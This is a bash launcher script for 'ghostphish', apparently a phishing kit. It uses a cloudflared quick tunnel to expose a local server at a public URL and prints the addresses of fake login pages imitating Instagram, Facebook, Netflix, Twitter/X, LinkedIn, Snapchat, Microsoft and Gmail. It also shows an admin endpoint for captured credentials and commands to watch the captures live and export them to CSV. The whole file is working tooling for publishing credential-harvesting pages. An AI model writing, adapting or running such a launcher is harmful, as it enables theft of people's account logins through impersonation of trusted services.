#!/usr/bin/env bash
#
# ghostphish tunnel launcher — cloudflared quick-tunnel
# Exposes localhost:8000 to a public *.trycloudflare.com URL
#
# Usage:  ./tunnel.sh
# Stop:   Ctrl+C
#

set -e

PORT=8000
LOG_FILE="/tmp/ghostphish_tunnel.log"

# ─── colors ────────────────────────────────────────────────
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
B='\033[1;34m'
W='\033[1;37m'
N='\033[0m'

banner() {
    echo -e "${R}"
    echo -e "   █▀▀ █░█ █▀█ █▀ ▀█▀ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█"
    echo -e "   █▄█ █▀█ █▄█ ▄█ ░█░ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄"
    echo -e "${N}   ${Y}⚡ cloudflared tunnel launcher${N}"
    echo -e "   ${C}Developed by ${R}Yaman.RedTeam${N}  ${C}·${N}  ${C}github.com/Yaman-RedTeam/ghostphish${N}\n"
}

# ─── checks ────────────────────────────────────────────────
banner

if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${R}[!] cloudflared not installed${N}"
    echo -e "${Y}[+] Install:${N} wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared"
    exit 1
fi

# Check container running
if ! curl -s -o /dev/null -w "%{http_code}" "http://localhost:${PORT}/health" | grep -q "200"; then
    echo -e "${R}[!] ghostphish not running on port ${PORT}${N}"
    echo -e "${Y}[+] Start it:${N} cd $(dirname "$0") && docker-compose up -d"
    exit 1
fi

echo -e "${G}[✓] ghostphish is up on http://localhost:${PORT}${N}"
echo -e "${G}[✓] Starting cloudflared quick-tunnel...${N}\n"

# ─── start tunnel in background, capture URL ──────────────
: > "$LOG_FILE"

cloudflared tunnel --url "http://localhost:${PORT}" > "$LOG_FILE" 2>&1 &
TUNNEL_PID=$!

# Wait for URL to appear (up to 30s)
URL=""
for i in {1..30}; do
    URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
    if [[ -n "$URL" ]]; then break; fi
    sleep 1
done

if [[ -z "$URL" ]]; then
    echo -e "${R}[!] Failed to get tunnel URL. Check ${LOG_FILE}${N}"
    kill $TUNNEL_PID 2>/dev/null
    exit 1
fi

# ─── show phishing URLs ────────────────────────────────────
clear
banner
echo -e "${W}════════════════════════════════════════════════════════${N}"
echo -e "${G}   ✓ TUNNEL ACTIVE${N}"
echo -e "${W}════════════════════════════════════════════════════════${N}"
echo -e "${C}   Public URL:${N} ${B}${URL}${N}\n"

echo -e "${Y}   ── Phishing pages ──────────────────────────────${N}"
printf "   %-12s  ${W}%s${N}\n" "Instagram"  "${URL}/instagram"
printf "   %-12s  ${W}%s${N}\n" "Facebook"   "${URL}/facebook"
printf "   %-12s  ${W}%s${N}\n" "Netflix"    "${URL}/netflix"
printf "   %-12s  ${W}%s${N}\n" "Twitter/X"  "${URL}/twitter"
printf "   %-12s  ${W}%s${N}\n" "LinkedIn"   "${URL}/linkedin"
printf "   %-12s  ${W}%s${N}\n" "Snapchat"   "${URL}/snapchat"
printf "   %-12s  ${W}%s${N}\n" "Microsoft"  "${URL}/microsoft"
printf "   %-12s  ${W}%s${N}\n" "Gmail"      "${URL}/gmail"
echo
echo -e "${Y}   ── Admin ─────────────────────────────────────${N}"
printf "   %-12s  ${W}%s${N}\n" "Captures"   "${URL}/admin/captures"
echo
echo -e "${W}════════════════════════════════════════════════════════${N}"
echo -e "${C}   Watch captures live:${N}  ${Y}watch -n 2 'curl -s http://localhost:${PORT}/admin/captures | python3 -m json.tool | head -60'${N}"
echo -e "${C}   Export to CSV:${N}       ${Y}python3 export_captures.py${N}"
echo -e "${C}   Tunnel log:${N}          ${Y}tail -f ${LOG_FILE}${N}"
echo -e "${W}════════════════════════════════════════════════════════${N}\n"
echo -e "${R}   [Ctrl+C to stop tunnel]${N}\n"

# Cleanup on exit
trap "echo -e '\n${R}[!] Stopping tunnel...${N}'; kill $TUNNEL_PID 2>/dev/null; exit 0" INT TERM

# Wait for tunnel process
wait $TUNNEL_PID
